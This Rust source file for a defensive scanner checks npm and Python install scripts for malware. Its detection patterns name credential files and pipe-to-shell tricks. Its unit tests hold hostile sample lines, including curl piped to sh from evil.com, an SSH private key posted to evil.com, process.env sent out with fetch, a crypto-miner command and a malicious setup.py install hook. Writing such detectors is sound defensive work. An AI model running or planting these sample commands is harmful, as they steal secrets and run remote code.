//! Install script analysis for detecting malicious behavior
//!
//! Analyzes package install scripts (npm postinstall, pip setup.py, etc.)
//! for suspicious patterns indicating malware, data exfiltration, or backdoors.

use crate::{ThreatIndicator, ThreatLevel, ThreatType};
use regex::Regex;
use std::collections::HashSet;

lazy_static::lazy_static! {
    /// Network-related suspicious patterns
    static ref NETWORK_PATTERNS: Vec<(&'static str, &'static str)> = vec![
        (r"https?://[^\s]+webhook[^\s]*", "Discord/Slack webhook exfiltration"),
        (r"https?://pastebin\.com", "Pastebin data exfiltration"),
        (r"https?://[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+", "Direct IP address connection"),
        (r"curl\s+[^\|]*\|\s*(sh|bash)", "Remote script execution (curl | sh)"),
        (r"wget\s+[^\|]*\|\s*(sh|bash)", "Remote script execution (wget | sh)"),
        (r"dns\.query|dns\.resolve", "DNS exfiltration"),
        (r"ngrok|localtunnel", "Tunnel service usage"),
    ];

    /// File system suspicious patterns
    static ref FILESYSTEM_PATTERNS: Vec<(&'static str, &'static str)> = vec![
        (r"~/.ssh|\.ssh/", "SSH directory access"),
        (r"~/.aws|\.aws/credentials", "AWS credentials access"),
        (r"~/.npmrc|\.npmrc", "npm credentials access"),
        (r"~/.pypirc|\.pypirc", "PyPI credentials access"),
        (r"~/.gitconfig|\.git-credentials", "Git credentials access"),
        (r"/etc/passwd|/etc/shadow", "System password file access"),
        (r"\.env|\.env\.local", "Environment file access"),
        (r"id_rsa|id_ed25519|id_ecdsa", "SSH private key access"),
        (r"\.docker/config\.json", "Docker credentials access"),
        (r"\.kube/config", "Kubernetes config access"),
    ];

    /// Code execution patterns
    static ref EXECUTION_PATTERNS: Vec<(&'static str, &'static str)> = vec![
        (r"eval\s*\(", "Dynamic code evaluation (eval)"),
        (r"exec\s*\(", "Process execution (exec)"),
        (r"child_process", "Node.js child process spawning"),
        (r"subprocess|os\.system|os\.popen", "Python subprocess execution"),
        (r"Function\s*\(", "Dynamic function creation"),
        (r#"Buffer\.from\([^)]+,\s*['"]base64['"]\)"#, "Base64 decode execution"),
        (r"atob\s*\(|btoa\s*\(", "Base64 encoding/decoding"),
        (r"\\x[0-9a-fA-F]{2}", "Hex-encoded strings"),
        (r"String\.fromCharCode", "Character code obfuscation"),
    ];

    /// Crypto mining patterns
    static ref CRYPTO_PATTERNS: Vec<(&'static str, &'static str)> = vec![
        (r"stratum\+tcp://", "Mining pool connection"),
        (r"xmrig|xmr-stak|cpuminer", "Crypto miner binary"),
        (r"coinhive|cryptonight|monero", "Cryptocurrency mining"),
        (r"hashrate|getwork|submitwork", "Mining protocol keywords"),
        (r"wallet.*address|pool.*address", "Mining wallet configuration"),
    ];

    /// Environment variable exfiltration
    static ref ENV_PATTERNS: Vec<(&'static str, &'static str)> = vec![
        (r"process\.env", "Node.js environment access"),
        (r"os\.environ|os\.getenv", "Python environment access"),
        (r"ENV\[|ENV\.fetch", "Ruby environment access"),
        (r"\$\{?[A-Z_]+\}?", "Shell environment variable"),
        (r"getenv\(", "C/PHP environment access"),
    ];
}

/// Analyze install script content for suspicious patterns
pub fn analyze_install_script(
    package_name: &str,
    script_type: &str,
    script_content: &str,
) -> Vec<ThreatIndicator> {
    let mut threats = Vec::new();
    let mut evidence = Vec::new();
    let mut max_threat_level = ThreatLevel::None;

    // Check network patterns
    for (pattern, description) in NETWORK_PATTERNS.iter() {
        if let Ok(re) = Regex::new(pattern) {
            if re.is_match(script_content) {
                evidence.push(format!("Network: {}", description));
                max_threat_level = max_level(max_threat_level, ThreatLevel::High);
            }
        }
    }

    // Check filesystem patterns
    for (pattern, description) in FILESYSTEM_PATTERNS.iter() {
        if let Ok(re) = Regex::new(pattern) {
            if re.is_match(script_content) {
                evidence.push(format!("Filesystem: {}", description));
                max_threat_level = max_level(max_threat_level, ThreatLevel::Critical);
            }
        }
    }

    // Check execution patterns
    for (pattern, description) in EXECUTION_PATTERNS.iter() {
        if let Ok(re) = Regex::new(pattern) {
            if re.is_match(script_content) {
                evidence.push(format!("Execution: {}", description));
                max_threat_level = max_level(max_threat_level, ThreatLevel::Medium);
            }
        }
    }

    // Check crypto mining patterns
    for (pattern, description) in CRYPTO_PATTERNS.iter() {
        if let Ok(re) = Regex::new(pattern) {
            if re.is_match(script_content) {
                evidence.push(format!("Crypto: {}", description));
                max_threat_level = max_level(max_threat_level, ThreatLevel::Critical);
            }
        }
    }

    // Check environment variable patterns (only if combined with network)
    let has_network = evidence.iter().any(|e| e.starts_with("Network:"));
    for (pattern, description) in ENV_PATTERNS.iter() {
        if let Ok(re) = Regex::new(pattern) {
            if re.is_match(script_content) && has_network {
                evidence.push(format!("Env exfiltration: {}", description));
                max_threat_level = max_level(max_threat_level, ThreatLevel::Critical);
            }
        }
    }

    if !evidence.is_empty() {
        threats.push(ThreatIndicator {
            package_name: package_name.to_string(),
            package_version: String::new(),
            threat_level: max_threat_level,
            threat_type: ThreatType::SuspiciousBehavior,
            description: format!(
                "Suspicious patterns detected in {} script",
                script_type
            ),
            evidence,
            recommendation: "Review install script carefully before installation. Consider using --ignore-scripts flag.".to_string(),
        });
    }

    threats
}

/// Analyze npm package.json scripts
pub fn analyze_npm_scripts(
    package_name: &str,
    scripts: &serde_json::Value,
) -> Vec<ThreatIndicator> {
    let mut threats = Vec::new();

    let suspicious_hooks = ["preinstall", "postinstall", "preuninstall", "postuninstall"];

    if let Some(scripts_obj) = scripts.as_object() {
        for hook in &suspicious_hooks {
            if let Some(script) = scripts_obj.get(*hook) {
                if let Some(script_str) = script.as_str() {
                    threats.extend(analyze_install_script(
                        package_name,
                        &format!("npm {}", hook),
                        script_str,
                    ));
                }
            }
        }
    }

    threats
}

/// Analyze Python setup.py for suspicious patterns
pub fn analyze_python_setup(package_name: &str, setup_content: &str) -> Vec<ThreatIndicator> {
    let mut threats = analyze_install_script(package_name, "setup.py", setup_content);

    // Additional Python-specific checks
    let mut evidence = Vec::new();

    // Check for cmdclass overrides (common malware technique)
    if setup_content.contains("cmdclass")
        && (setup_content.contains("install") || setup_content.contains("develop"))
    {
        evidence.push("Custom install command class detected".to_string());
    }

    // Check for __import__ obfuscation
    if setup_content.contains("__import__") {
        evidence.push("Dynamic import obfuscation detected".to_string());
    }

    // Check for compile() usage
    if setup_content.contains("compile(") && setup_content.contains("exec(") {
        evidence.push("Dynamic code compilation and execution".to_string());
    }

    if !evidence.is_empty() {
        threats.push(ThreatIndicator {
            package_name: package_name.to_string(),
            package_version: String::new(),
            threat_level: ThreatLevel::High,
            threat_type: ThreatType::SuspiciousBehavior,
            description: "Python-specific suspicious patterns in setup.py".to_string(),
            evidence,
            recommendation: "Inspect setup.py manually before installing".to_string(),
        });
    }

    threats
}

/// Known malicious install script hashes
pub fn get_known_malicious_hashes() -> HashSet<String> {
    // SHA-256 hashes of known malicious install scripts
    let hashes: Vec<&str> = vec![
        // Add known malicious script hashes here
        // These would be populated from threat intelligence feeds
    ];
    hashes.into_iter().map(String::from).collect()
}

fn max_level(a: ThreatLevel, b: ThreatLevel) -> ThreatLevel {
    match (a, b) {
        (ThreatLevel::Critical, _) | (_, ThreatLevel::Critical) => ThreatLevel::Critical,
        (ThreatLevel::High, _) | (_, ThreatLevel::High) => ThreatLevel::High,
        (ThreatLevel::Medium, _) | (_, ThreatLevel::Medium) => ThreatLevel::Medium,
        (ThreatLevel::Low, _) | (_, ThreatLevel::Low) => ThreatLevel::Low,
        _ => ThreatLevel::None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_curl_pipe_sh() {
        let script = "curl https://evil.com/script.sh | sh";
        let threats = analyze_install_script("test-pkg", "postinstall", script);
        assert!(!threats.is_empty());
        assert!(threats[0]
            .evidence
            .iter()
            .any(|e| e.contains("Remote script execution")));
    }

    #[test]
    fn test_detect_ssh_key_access() {
        let script = "cat ~/.ssh/id_rsa | curl -X POST https://evil.com";
        let threats = analyze_install_script("test-pkg", "postinstall", script);
        assert!(!threats.is_empty());
        assert_eq!(threats[0].threat_level, ThreatLevel::Critical);
    }

    #[test]
    fn test_detect_crypto_miner() {
        let script = "wget xmrig && ./xmrig -o stratum+tcp://pool.com:3333";
        let threats = analyze_install_script("test-pkg", "postinstall", script);
        assert!(!threats.is_empty());
        assert!(threats[0].evidence.iter().any(|e| e.contains("Crypto")));
    }

    #[test]
    fn test_detect_env_exfiltration() {
        let script = r#"
            const data = JSON.stringify(process.env);
            fetch('https://evil.com/webhook', {method: 'POST', body: data});
        "#;
        let threats = analyze_install_script("test-pkg", "postinstall", script);
        assert!(!threats.is_empty());
    }

    #[test]
    fn test_safe_script() {
        let script = "echo 'Installation complete'";
        let threats = analyze_install_script("safe-pkg", "postinstall", script);
        assert!(threats.is_empty());
    }

    #[test]
    fn test_python_setup_cmdclass() {
        let setup = r#"
from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        import os
        os.system('curl https://evil.com | sh')
        install.run(self)

setup(
    name='evil-package',
    cmdclass={'install': CustomInstall}
)
        "#;
        let threats = analyze_python_setup("evil-pkg", setup);
        assert!(!threats.is_empty());
    }
}
